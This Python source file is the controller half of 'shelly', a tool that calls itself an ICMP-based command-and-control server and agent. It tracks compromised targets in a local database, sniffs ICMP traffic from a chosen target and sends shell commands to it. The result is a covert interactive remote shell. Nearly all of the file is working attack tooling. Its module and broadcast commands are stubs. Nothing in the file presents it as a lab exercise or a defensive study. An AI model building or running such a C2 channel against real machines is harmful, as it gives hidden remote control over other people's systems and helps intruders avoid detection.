#!/usr/bin/python3

# self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))

from scapy.all import sniff
import base64
from shellylib import Host
from tinydb import TinyDB, Query
import os
from termcolor import colored
import sys
import time
import argparse
import socket
import readline
from multiprocessing import Process, Manager

manager = Manager()
shell_lock = manager.Value(bool, False)

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.db = TinyDB('./db.json')
        self.mock_stdout = ""


    def list_hosts(self):
        response = "[ Targets ]\n"

        targets = self.db.all()
        targets = sorted(targets, key=lambda d: d['id'])

        for target in targets:
            response += f"[*] {target['id']}\n"
            response += f" --> {target['ip']}\n"
            response += f" --> {target['location']}\n"
            response += f" --> {target['status']}\n"
        
        return response

    def sniffing(self, target_ip):
        sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")

    def filter_commands(self, cmd):
        cmd = cmd.split(" ")[0]
        if cmd in ("vim", "nano", "vi", "visudo", "watch", "emacs"):
            print(f"Command {cmd} is not valid as it requires an interactive shell")
            return True
        return False

    def interact(self, target):
        Target = Query()
        target = self.db.search(Target.id == target)[0]

        sniffer = Process(target=self.sniffing, args=(target['ip'],))
        sniffer.start()

        while True:
            if not shell_lock.value:
                cmd = input(colored("shell > ", "red"))
                shell_lock.value = True
                if cmd == "exit":
                    sniffer.kill()
                    break
                elif len(cmd) != 0 and not self.filter_commands(cmd):
                    self.send(target['ip'], "instruction", cmd.encode())
                else:
                    shell_lock.value = False
        
    def instruction(self, shellpack):
        if shellpack['option'] == "TRUNCATED":
            print(shellpack['data'].decode(), end="")
        elif shellpack['option'] == "COMPLETE":
            print(shellpack['data'].decode())
            shell_lock.value = False
        elif shellpack['option'] == "ERROR":
            print(f"[ERROR] {shellpack['data'].decode()}")
            shell_lock.value = False
        else:
            print(f"{shellpack['data'].decode()}")
            shell_lock.value = False

    def help(self):
        help =  colored("     _          _ _       \n", "cyan")
        help += colored("    | |        | | |      \n", "cyan")
        help += colored(" ___| |__   ___| | |_   _ \n", "cyan")
        help += colored("/ __| '_ \ / _ \ | | | | |\n", "cyan")
        help += colored("\__ \ | | |  __/ | | |_| |\n", "cyan")
        help += colored("|___/_| |_|\___|_|_|\__, |\n", "cyan")
        help += colored("                     __/ |\n", "cyan")
        help += colored("                    |___/ \n", "cyan")
        help += "An ICMP based C2 server and agent\n\n"

        help += "Usage: shelly [command]\n\n"
        help += "Available Commands:\n"
        help += "  help         Prints this message\n"
        help += "  ls           List connected targets\n"
        help += "  interact     Interact with a specified target using the ICMP shell\n"
        help += "  run          Runs an included module against a specified target or all targets\n"
        help += "  broadcast    Broadcasts a message to all users on all targets\n"
        print(help)

def main():
    controller = Controller()
    
    if len(sys.argv) < 2 :
        controller.help()
        return

    match sys.argv[1]:
        case "ls":
            print(controller.list_hosts())
        case "interact":
            controller.interact(int(sys.argv[2]))
        case "run":
            print("Run a specific module")
        case "broadcast":
            print("Broadcast")
        case "help":
            controller.help()
        case _:
            controller.help()

if __name__ == "__main__":
    main()

            
    
    
